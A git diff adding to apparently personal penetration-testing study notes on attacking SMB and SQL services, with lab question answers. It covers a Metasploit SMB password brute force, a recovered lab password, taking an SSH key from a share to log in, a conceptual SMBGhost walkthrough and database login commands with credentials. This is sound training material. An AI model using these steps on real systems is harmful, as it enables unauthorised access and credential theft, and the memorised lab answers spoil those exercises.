@@ -322,6 +322,46 @@ https://github.com/CiscoCXSecurity/enum4linux
 https://github.com/cddmp/enum4linux-ng
 $./enum4linux-ng.py 10.10.11.45 -A -C 
 
+<test>"What is the name of the shared folder with READ and WRITE permissions?"
+enum4linux <ip>
+<test>"What is the password for the username "jason"?"
+msfconsole -q
+use auxiliary/scanner/smb/smb_login
+set rhosts STMIP
+set SMBUSER jason
+set PASS_FILE ./pws.list
+set stop_on_success true
+run
+jason:34c8zuNBo91!@28Bszh'
+<test>"Login as the user "jason" via SSH and find the flag.txt. Submit the contents as the answer."
+smbclient -U jason //ip/GGJ
+get id_rsa
+exit 
+chmod 600 
+ssh -i id_rsa jason@ip 
+cat flag.txt 
+
+\\\\\\\\\\\==============================
+Lastest SMB Vulnerabilities
+SMBGHOST with the CVE 2020-0796 vul smb3.1.1 target windows 10 1903 1909 RCE
+
+Concept of attack
+Initiation of the Attack
+Step	SMBGhost	Concept of Attacks - Category
+1.	The client sends a request manipulated by the attacker to the SMB server.	Source
+2.	The sent compressed packets are processed according to the negotiated protocol responses.	Process
+3.	This process is performed with the system's privileges or at least with the privileges of an administrator.	Privileges
+4.	The local process is used as the destination, which should process these compressed packets.	Destination
+Trigger Remote Code Execution
+Step	SMBGhost	Concept of Attacks - Category
+5.	The sources used in the second cycle are from the previous process.	Source
+6.	In this process, the integer overflow occurs by replacing the overwritten buffer with the attacker's instructions and forcing the CPU to execute those instructions.	Process
+7.	The same privileges of the SMB server are used.	Privileges
+8.	The remote attacker system is used as the destination, in this case, granting access to the local system.	Destination
+However, despite the vulnerability's complexity due to the buffer's manipulation, which we can see in the PoC, the concept of the attack nevertheless applies here.
+
+
+
 \\Protocol Specifics Attacks\
 If a null session is not enabled, we will need credentials to interact with the SMB protocol. Two common ways to obtain credentials are brute forcing and password spraying.
 \
@@ -404,5 +444,44 @@ Change a user's password.
 Create a new domain user.
 Create a new shared folder.
 We also cover enumeration using RPC in the Active Directory Enumeration & Attacks module.
-
 Keep in mind that some specific configurations are required to allow these types of changes through RPC. We can use the rpclient man page or SMB Access from Linux Cheat Sheet from the SANS Institute to explore this further.
+
+\\======================================================
+\\Attacking SQL Databases
+Enumeration
+MSSQL uses ports TCP/1433 and UDP1434 and MySQL uses TCP/3306 in hidden mod MSSQL use TCP/2433 port,
+$nmap -Pn -sV -sC -p1433 10.10.10.125
+\\Authentication Mechanisms
+Authentication Type	Description
+Windows authentication mode	This is the default, often referred to as integrated security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials.
+Mixed mode	Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.
+-in the past it have CVE-2012-2122 in MySQL 5.6.x servers, allow bypass authen by repeadly using the same incorrect password for the given account because the timing attack vul existed in the way MySQL handled authen attempts
+\\Misconfiguration
+\\Privileges
+Read or change the contents of a database
+
+Read or change the server configuration
+
+Execute commands
+
+Read local files
+
+Communicate with other databases
+
+Capture the local system hash
+
+Impersonate existing users
+
+Gain access to other networks
+\\protocol specific attack
+It is crucial to understand how SQL syntax works. We can use the free SQL Injection Fundamentals module to introduce ourselves to SQL syntax. Even though this module covers MySQL, MSSQL and MySQL syntax are pretty similar.
+\\Read/Change the Databases
+First, we need to identify existing databases on the server, what tables the database contains, and finally, the contents of each table. Keep in mind that we may find databases with hundreds of tables. If our goal is not just getting access to the data, we will need to pick which tables may contain interesting information to continue our attacks, such as usernames and passwords, tokens, configurations, and more. Let's see how we can do this:
+\\MySQL - Connecting to the SQL Server
+$mysql -u julio -pPassword12 -h 10.129.20.13
+\\Sqlcmd - Connecting to the SQL Server
+$sqlcmd -S SRVMSSQL -U julio -P 'Mypassword' -y 30 -Y 30
+Note: When we authenticate to MSSQL using sqlcmd we can use the parameters -y (SQLCMDMAXVARTYPEWIDTH) and -Y (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance.
+$sqsh -S 10.129.203.7 -U julio -P 'Passwordp' -H
+<alter>
+$mssqlclient.py -p 1433 julio@10.129.203.7
